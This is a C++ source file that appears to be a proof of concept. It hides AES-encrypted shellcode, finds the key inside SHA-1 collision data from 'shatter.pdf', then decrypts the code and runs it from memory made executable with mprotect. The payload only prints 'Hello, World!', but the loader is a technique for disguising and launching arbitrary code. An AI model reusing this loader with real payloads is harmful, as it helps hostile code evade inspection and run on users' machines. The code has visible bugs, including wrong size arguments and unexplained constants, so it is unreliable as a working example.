#include <iostream>
#include "collisionData.h"
#include <sys/mman.h>
#include <unistd.h>

// this encrypted shellcode prints "Hello, World!" to the console on MacOS
char codeEnc[] = 
"\x49\xe9\x10\x52\x54\xcb\xcc\x71\x75\xf9\x98\x42\x05\x75\xc4\x0f"
"\xb9\x37\xf0\xfa\xe8\xfa\x6a\x38\xb3\x14\x44\x58\x37\xdf\x3c\xe2"
"\xdb\x2a\x99\xda\x47\x95\x40\x69\x96\xa6\x23\x9d\xe2\x4c\xde\x2e"
"\xb8\xb9\xb9\xe4\xab\xf8\xee\x25\xd9\xdf\xc5\xcf\x1e\x24\x09\xca"
"\xac\x37\xc4\xf9\x2b\x0d\xa0\x75\x45\xe0\xb2\x20\xc5\xee\xc4\x8c"
"\x94\xe1\xe5\x56\x42\x03\x99\x81\xae\x50\xf2\x08\x5f\xbb\x97\xee";

// same as above but in unencrypted form, makes testing easier
char code[] = 
"\x55\x48\x89\xe5\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x04\x4c"
"\x89\xc0\x48\x31\xff\x66\xbf\x01\x00\xeb\x1e\x5e\x48\x31\xd2\xb2"
"\x0e\x0f\x05\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x01\x4c\x89"
"\xc0\x31\xff\x0f\x05\x48\x89\xec\x5d\xe8\xdd\xff\xff\xff\x48\x65"
"\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x0a";

//this is the 3*chunksize
int collSize = sizeof(collision_data); 
// the second 16 bytes of the shatter.pdf
char const *pattern = "\x0a\x31\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x2f\x57\x69\x64\x74";
int patternSize = 16;

// the decrypted shellcode
char* shellcode;

void print_bytes(const void *object, size_t size)
{
    // This is for C++; in C just drop the static_cast<>() and assign.
    const unsigned char * const bytes = static_cast<const unsigned char *>(object);
    size_t i;

    printf("[ ");
    for(i = 0; i < size; i++)
    {
        printf("%02x ", bytes[i]);
    }
    printf("]\n");
}

int good() {
    std::cout << "good Execution..\n";
    return 0;
}

int evil(char *code, size_t len) {
    std::cout << "evil Execution..\n";


    print_bytes(code, len);
    // cast shellcode into c++ function
    int (*ret)() = (int (*)())code;
    // remove memory protection on page
    // TODO: how does this work?
    void *page = (void *)((uintptr_t)code & ~(getpagesize() - 1));
    mprotect(page, sizeof(code), PROT_EXEC);

    // exec shellcode
    ret();

    return 0;
}

int searchPattern(char* buffer, int buffLen)
{
    for (int i=0; i< collSize; i++)
    {
        if (!memcmp(collision_data+i, pattern, patternSize))
            return i;
    }
    return -1;
}

int main() {
    int verified = 1;
    int shellcodeLen = sizeof(codeEnc) - 1;
    std::cout << "Length of Shellcode: " << shellcodeLen << "\n";

    // first we find the key for the encryption algo
    // in this case it's the second 16 byte of the shatter pdf
    int keyPos = searchPattern(&collision_data[0], collSize);
    if(keyPos == -1)
    {
        std::cout << "Key not found! exiting..\n";
        return -1;
    }
    // TODO: why 0xC0
    keyPos = keyPos - 16 + 0xC0;
    std::cout << "Key Position: " << keyPos << "\n";

    shellcode = (char*)malloc(shellcodeLen);
    memset(shellcode, 0, shellcodeLen);

    CRijndael oRijndael;
    oRijndael.MakeKey(&collision_data[keyPos], "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16, 16);
    for (int i = 0; i < shellcodeLen; i += 16)
    {
        oRijndael.DecryptBlock(codeEnc + i, shellcode + i);
    }

    print_bytes(shellcode, shellcodeLen);
    if(verified) {
        evil(shellcode, sizeof(shellcodeLen));
    } else {
        good();
    }

    return 0;
}
